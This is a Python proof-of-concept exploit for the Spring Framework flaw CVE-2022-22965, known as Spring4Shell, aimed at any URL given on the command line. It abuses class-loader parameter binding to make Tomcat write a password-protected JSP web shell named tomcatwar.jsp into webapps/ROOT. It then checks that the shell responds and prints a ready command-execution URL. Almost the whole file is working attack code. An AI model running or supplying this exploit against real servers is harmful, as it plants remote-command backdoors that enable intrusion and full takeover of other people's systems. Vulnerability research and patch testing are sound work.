import argparse
import requests
import time
from urllib.parse import urljoin
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def run(url):
    headers = {
        "suffix": "%>//",
        "c1": "Runtime",
        "c2": "<%",
        "DNT": "1",     #Do Not Track
        "Content-Type": "application/x-www-form-urlencoded",
    }
    data = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22w%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="

    try:
        requests.post(url=url,data=data,headers=headers,verify=False,allow_redirects=False,timeout=15)#verify=False(avoid ssl) allow_redirects=False(拒绝默认的301/302重定向)
        time.sleep(10)
        shellurl = urljoin(url,'tomcatwar.jsp')
        shellexploit = requests.post(shellurl,allow_redirects=False,verify=False,stream=True,timeout=15)
        print(shellexploit)
        if shellexploit.status_code == 200:
            print("It looks likely vulnerable"+" please copy and skip "+shellurl+"?pwd=w&cmd=ls")

    except Exception as e:
            print(e)
            pass

if __name__ == '__main__':
    parameter = argparse.ArgumentParser(description='Poc CVE-2022-22965:')
    parameter.add_argument('--file',help='url file',required=False)
    parameter.add_argument('--url',help='ip:port',required=False)
    para = parameter.parse_args()

    if para.url:
        run(para.url)
        exit()
    else:
        parameter.print_help()
